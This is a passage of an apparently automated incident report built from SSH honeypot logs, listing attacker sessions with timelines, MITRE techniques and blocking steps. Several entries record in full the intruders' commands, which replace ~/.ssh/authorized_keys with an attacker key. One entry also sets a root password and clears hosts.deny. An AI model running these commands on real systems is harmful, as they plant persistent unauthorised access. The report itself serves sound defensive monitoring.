| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:25:16` | `cowrie.session.connect` |
| `2026-05-25 22:25:16` | `cowrie.client.version` |
| `2026-05-25 22:25:17` | `cowrie.client.kex` |
| `2026-05-25 22:25:17` | `cowrie.login.success` |
| `2026-05-25 22:25:17` | `cowrie.session.params` |
| `2026-05-25 22:25:17` | `cowrie.command.input` |
| `2026-05-25 22:25:17` | `cowrie.command.failed` |
| `2026-05-25 22:25:18` | `cowrie.log.closed` |
| `2026-05-25 22:25:18` | `cowrie.session.params` |
| `2026-05-25 22:25:18` | `cowrie.command.input` |
| `2026-05-25 22:25:18` | `cowrie.session.file_download` |
| `2026-05-25 22:25:18` | `cowrie.log.closed` |
| `2026-05-25 22:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f989962fca15

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:25 |
| **Last Seen** | 2026-05-25 22:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:25:20` | `cowrie.session.connect` |
| `2026-05-25 22:25:20` | `cowrie.client.version` |
| `2026-05-25 22:25:20` | `cowrie.client.kex` |
| `2026-05-25 22:25:21` | `cowrie.login.success` |
| `2026-05-25 22:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-552bbc825388

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:26 |
| **Last Seen** | 2026-05-25 22:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:26:02` | `cowrie.session.connect` |
| `2026-05-25 22:26:02` | `cowrie.client.version` |
| `2026-05-25 22:26:02` | `cowrie.client.kex` |
| `2026-05-25 22:26:02` | `cowrie.login.success` |
| `2026-05-25 22:26:03` | `cowrie.session.params` |
| `2026-05-25 22:26:03` | `cowrie.command.input` |
| `2026-05-25 22:26:03` | `cowrie.command.failed` |
| `2026-05-25 22:26:03` | `cowrie.log.closed` |
| `2026-05-25 22:26:03` | `cowrie.session.params` |
| `2026-05-25 22:26:03` | `cowrie.command.input` |
| `2026-05-25 22:26:03` | `cowrie.session.file_download` |
| `2026-05-25 22:26:03` | `cowrie.log.closed` |
| `2026-05-25 22:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b79e0a095d6c

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:26 |
| **Last Seen** | 2026-05-25 22:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:26:05` | `cowrie.session.connect` |
| `2026-05-25 22:26:05` | `cowrie.client.version` |
| `2026-05-25 22:26:06` | `cowrie.client.kex` |
| `2026-05-25 22:26:06` | `cowrie.login.success` |
| `2026-05-25 22:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b66b5cf2ed3

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:27 |
| **Last Seen** | 2026-05-25 22:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:27:54` | `cowrie.session.connect` |
| `2026-05-25 22:27:54` | `cowrie.client.version` |
| `2026-05-25 22:27:54` | `cowrie.client.kex` |
| `2026-05-25 22:27:54` | `cowrie.login.success` |
| `2026-05-25 22:27:55` | `cowrie.session.params` |
| `2026-05-25 22:27:55` | `cowrie.command.input` |
| `2026-05-25 22:27:55` | `cowrie.command.failed` |
| `2026-05-25 22:27:55` | `cowrie.log.closed` |
| `2026-05-25 22:27:55` | `cowrie.session.params` |
| `2026-05-25 22:27:55` | `cowrie.command.input` |
| `2026-05-25 22:27:55` | `cowrie.session.file_download` |
| `2026-05-25 22:27:55` | `cowrie.log.closed` |
| `2026-05-25 22:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5458088fd6b

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:27 |
| **Last Seen** | 2026-05-25 22:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:27:58` | `cowrie.session.connect` |
| `2026-05-25 22:27:58` | `cowrie.client.version` |
| `2026-05-25 22:27:59` | `cowrie.client.kex` |
| `2026-05-25 22:27:59` | `cowrie.login.success` |
| `2026-05-25 22:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8c9aed659f1

| Field | Detail |
|---|---|
| **Source IP** | `120.48.53[.]156` |
| **First Seen** | 2026-05-25 22:29 |
| **Last Seen** | 2026-05-25 22:29 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:29:12` | `cowrie.session.connect` |
| `2026-05-25 22:29:12` | `cowrie.client.version` |
| `2026-05-25 22:29:12` | `cowrie.client.kex` |
| `2026-05-25 22:29:16` | `cowrie.login.success` |
| `2026-05-25 22:29:17` | `cowrie.session.params` |
| `2026-05-25 22:29:17` | `cowrie.command.input` |
| `2026-05-25 22:29:17` | `cowrie.command.failed` |
| `2026-05-25 22:29:17` | `cowrie.log.closed` |
| `2026-05-25 22:29:17` | `cowrie.session.params` |
| `2026-05-25 22:29:17` | `cowrie.command.input` |
| `2026-05-25 22:29:18` | `cowrie.session.file_download` |
| `2026-05-25 22:29:18` | `cowrie.log.closed` |
| `2026-05-25 22:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.53[.]156` to AbuseIPDB if not already reported
- [ ] Block `120.48.53[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87cbc4535da2

| Field | Detail |
|---|---|
| **Source IP** | `120.48.53[.]156` |
| **First Seen** | 2026-05-25 22:29 |
| **Last Seen** | 2026-05-25 22:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:29:24` | `cowrie.session.connect` |
| `2026-05-25 22:29:24` | `cowrie.client.version` |
| `2026-05-25 22:29:24` | `cowrie.client.kex` |
| `2026-05-25 22:29:29` | `cowrie.login.success` |
| `2026-05-25 22:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.53[.]156` to AbuseIPDB if not already reported
- [ ] Block `120.48.53[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b01c0c64b0ef

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:32 |
| **Last Seen** | 2026-05-25 22:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:32:40` | `cowrie.session.connect` |
| `2026-05-25 22:32:40` | `cowrie.client.version` |
| `2026-05-25 22:32:40` | `cowrie.client.kex` |
| `2026-05-25 22:32:40` | `cowrie.login.success` |
| `2026-05-25 22:32:41` | `cowrie.session.params` |
| `2026-05-25 22:32:41` | `cowrie.command.input` |
| `2026-05-25 22:32:41` | `cowrie.command.failed` |
| `2026-05-25 22:32:41` | `cowrie.log.closed` |
| `2026-05-25 22:32:41` | `cowrie.session.params` |
| `2026-05-25 22:32:41` | `cowrie.command.input` |
| `2026-05-25 22:32:41` | `cowrie.session.file_download` |
| `2026-05-25 22:32:41` | `cowrie.log.closed` |
| `2026-05-25 22:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b761931c083

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:32 |
| **Last Seen** | 2026-05-25 22:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:32:46` | `cowrie.session.connect` |
| `2026-05-25 22:32:46` | `cowrie.client.version` |
| `2026-05-25 22:32:46` | `cowrie.client.kex` |
| `2026-05-25 22:32:46` | `cowrie.login.success` |
| `2026-05-25 22:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-037fe831d6d7

| Field | Detail |
|---|---|
| **Source IP** | `120.48.53[.]156` |
| **First Seen** | 2026-05-25 22:34 |
| **Last Seen** | 2026-05-25 22:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:34:32` | `cowrie.session.connect` |
| `2026-05-25 22:34:32` | `cowrie.client.version` |
| `2026-05-25 22:34:32` | `cowrie.client.kex` |
| `2026-05-25 22:34:33` | `cowrie.login.success` |
| `2026-05-25 22:34:33` | `cowrie.session.params` |
| `2026-05-25 22:34:33` | `cowrie.command.input` |
| `2026-05-25 22:34:33` | `cowrie.command.failed` |
| `2026-05-25 22:34:34` | `cowrie.log.closed` |
| `2026-05-25 22:34:34` | `cowrie.session.params` |
| `2026-05-25 22:34:34` | `cowrie.command.input` |
| `2026-05-25 22:34:35` | `cowrie.session.file_download` |
| `2026-05-25 22:34:35` | `cowrie.log.closed` |
| `2026-05-25 22:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.53[.]156` to AbuseIPDB if not already reported
- [ ] Block `120.48.53[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e3206995c33

| Field | Detail |
|---|---|
| **Source IP** | `120.48.53[.]156` |
| **First Seen** | 2026-05-25 22:34 |
| **Last Seen** | 2026-05-25 22:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:34:42` | `cowrie.session.connect` |
| `2026-05-25 22:34:42` | `cowrie.client.version` |
| `2026-05-25 22:34:43` | `cowrie.client.kex` |
| `2026-05-25 22:34:44` | `cowrie.login.success` |
| `2026-05-25 22:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.53[.]156` to AbuseIPDB if not already reported
- [ ] Block `120.48.53[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-261b78cbe6d7

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:35 |
| **Last Seen** | 2026-05-25 22:36 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:kEm956h8lYu9"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:35:38` | `cowrie.session.connect` |
| `2026-05-25 22:35:38` | `cowrie.client.version` |
| `2026-05-25 22:35:38` | `cowrie.client.kex` |
| `2026-05-25 22:35:39` | `cowrie.login.success` |
| `2026-05-25 22:35:39` | `cowrie.session.params` |
| `2026-05-25 22:35:39` | `cowrie.command.input` |
| `2026-05-25 22:35:39` | `cowrie.command.failed` |
| `2026-05-25 22:35:39` | `cowrie.log.closed` |
| `2026-05-25 22:35:39` | `cowrie.session.params` |
| `2026-05-25 22:35:39` | `cowrie.command.input` |
| `2026-05-25 22:35:39` | `cowrie.session.file_download` |
| `2026-05-25 22:35:39` | `cowrie.log.closed` |
| `2026-05-25 22:35:55` | `cowrie.session.params` |
| `2026-05-25 22:35:55` | `cowrie.command.input` |
| `2026-05-25 22:35:56` | `cowrie.log.closed` |
| `2026-05-25 22:35:56` | `cowrie.session.params` |
| `2026-05-25 22:35:56` | `cowrie.command.input` |
| `2026-05-25 22:35:56` | `cowrie.log.closed` |
| `2026-05-25 22:35:56` | `cowrie.session.params` |
| `2026-05-25 22:35:56` | `cowrie.command.input` |
| `2026-05-25 22:35:56` | `cowrie.session.file_download` |
| `2026-05-25 22:35:56` | `cowrie.log.closed` |
| `2026-05-25 22:35:57` | `cowrie.session.params` |
| `2026-05-25 22:35:57` | `cowrie.command.input` |
| `2026-05-25 22:35:57` | `cowrie.log.closed` |
| `2026-05-25 22:35:57` | `cowrie.session.params` |
| `2026-05-25 22:35:57` | `cowrie.command.input` |
| `2026-05-25 22:35:57` | `cowrie.log.closed` |
| `2026-05-25 22:35:57` | `cowrie.session.params` |
| `2026-05-25 22:35:57` | `cowrie.command.input` |
| `2026-05-25 22:35:57` | `cowrie.command.input` |
| `2026-05-25 22:35:58` | `cowrie.log.closed` |
| `2026-05-25 22:35:58` | `cowrie.session.params` |
| `2026-05-25 22:35:58` | `cowrie.command.input` |
| `2026-05-25 22:35:58` | `cowrie.log.closed` |
| `2026-05-25 22:35:58` | `cowrie.session.params` |
| `2026-05-25 22:35:58` | `cowrie.command.input` |
| `2026-05-25 22:35:58` | `cowrie.log.closed` |
| `2026-05-25 22:35:58` | `cowrie.session.params` |
| `2026-05-25 22:35:58` | `cowrie.command.input` |
| `2026-05-25 22:35:59` | `cowrie.log.closed` |
| `2026-05-25 22:35:59` | `cowrie.session.params` |
| `2026-05-25 22:35:59` | `cowrie.command.input` |
| `2026-05-25 22:35:59` | `cowrie.log.closed` |
| `2026-05-25 22:35:59` | `cowrie.session.params` |
| `2026-05-25 22:35:59` | `cowrie.command.input` |
| `2026-05-25 22:35:59` | `cowrie.log.closed` |
| `2026-05-25 22:36:00` | `cowrie.session.params` |
| `2026-05-25 22:36:00` | `cowrie.command.input` |
| `2026-05-25 22:36:00` | `cowrie.log.closed` |
| `2026-05-25 22:36:00` | `cowrie.session.params` |
| `2026-05-25 22:36:00` | `cowrie.command.input` |
| `2026-05-25 22:36:00` | `cowrie.log.closed` |
| `2026-05-25 22:36:00` | `cowrie.session.params` |
| `2026-05-25 22:36:00` | `cowrie.command.input` |
| `2026-05-25 22:36:01` | `cowrie.log.closed` |
| `2026-05-25 22:36:01` | `cowrie.session.params` |
| `2026-05-25 22:36:01` | `cowrie.command.input` |
| `2026-05-25 22:36:01` | `cowrie.log.closed` |
| `2026-05-25 22:36:01` | `cowrie.session.params` |
| `2026-05-25 22:36:01` | `cowrie.command.input` |
| `2026-05-25 22:36:01` | `cowrie.log.closed` |
| `2026-05-25 22:36:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d2af0ca7c8e

| Field | Detail |
|---|---|
| **Source IP** | `120.48.53[.]156` |
| **First Seen** | 2026-05-25 22:37 |
| **Last Seen** | 2026-05-25 22:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:37:44` | `cowrie.session.connect` |
| `2026-05-25 22:37:44` | `cowrie.client.version` |
| `2026-05-25 22:37:45` | `cowrie.client.kex` |
| `2026-05-25 22:37:46` | `cowrie.login.success` |
| `2026-05-25 22:37:46` | `cowrie.session.params` |
| `2026-05-25 22:37:46` | `cowrie.command.input` |
| `2026-05-25 22:37:46` | `cowrie.command.failed` |
| `2026-05-25 22:37:47` | `cowrie.log.closed` |
| `2026-05-25 22:37:47` | `cowrie.session.params` |
| `2026-05-25 22:37:47` | `cowrie.command.input` |
| `2026-05-25 22:37:48` | `cowrie.session.file_download` |
| `2026-05-25 22:37:48` | `cowrie.log.closed` |
| `2026-05-25 22:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.53[.]156` to AbuseIPDB if not already reported
- [ ] Block `120.48.53[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d39dc747984

| Field | Detail |
|---|---|
| **Source IP** | `120.48.53[.]156` |
| **First Seen** | 2026-05-25 22:37 |
| **Last Seen** | 2026-05-25 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
